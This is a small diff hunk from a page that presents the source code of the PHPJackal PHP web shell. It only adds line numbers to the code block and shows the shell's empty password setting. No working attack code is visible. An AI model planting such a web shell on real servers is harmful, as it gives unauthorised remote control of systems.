@@ -16,7 +16,7 @@ PHPJackal v$v &#8211; Powered By NetJackal
 
 ### PHPJackal Shell Source Code
 
-{% highlight php %}<?php
+{% highlight php linenos %}<?php
 #--Config--#
 $login_password= ''; //Set password
 #----------#
